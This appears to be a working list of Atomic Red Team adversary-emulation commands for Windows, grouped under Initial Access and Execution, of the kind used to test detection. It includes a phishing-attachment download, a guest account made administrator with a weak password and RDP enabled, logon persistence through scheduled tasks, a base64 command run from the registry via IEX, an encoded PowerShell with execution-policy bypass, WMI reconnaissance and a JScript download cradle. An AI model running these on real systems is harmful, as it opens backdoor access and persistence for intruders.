Initial Access
*
powershell -Command "$url='https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm"

*
powershell -Command "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter 'drivetype=2' | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives) { write-host 'Removable Drive Found:' $Drive; New-Item -Path $Drive\T1091Test1.txt -ItemType 'file' -Force -Value 'T1091 Test 1 has created this file to simulate malware spread to removable drives.' }"
Pre-req: powershell -Command "Out-File -FilePath '$env:TEMP\ExplorerSync.db'"

*
copy "%temp%\ExplorerSync.db" "%temp%\..\Microsoft\ExplorerSync.db"
schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc ONLOGON /f

*
net user guest /active:yes
net user guest  Password123
net localgroup Administrators guest  /add
net localgroup "Remote Desktop Users" guest  /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f


Execution
*
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" 
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

*
Scheduled task Local:
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 10:40

*
Task Scheduler via VBA:
powershell -Command "Write-Host 'You will need to install Microsoft Word manually to meet this requirement'"

*
Scheduled Task Executing Base64 Encoded Commands From Registry:
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 10:58


*
PowerShell Modify A Scheduled Task:
powershell -Command "$Action = New-ScheduledTaskAction -Execute 'cmd.exe'; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Administrators' -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute 'Notepad.exe'; Set-ScheduledTask 'AtomicTaskModifed' -Action $NewAction"

*
WMI Reconnaissance Users:
wmic useraccount get /ALL /format:csv

*
WMI Reconnaissance Processes:
wmic process get caption,executablepath,commandline /format:csv

*
WMI Reconnaissance Software:
wmic qfe get description,installedOn /format:csv

*
WMI Reconnaissance List Remote Services
wmic /node:"127.0.0.1" service where (caption like "%Spooler%")

*
WMI Execute Local Process
wmic process call create notepad.exe




*
Create a Process using WMI Query and an Encoded Command
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA


*
echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
cscript //E:Jscript %TEMP%\OSTapGet.js
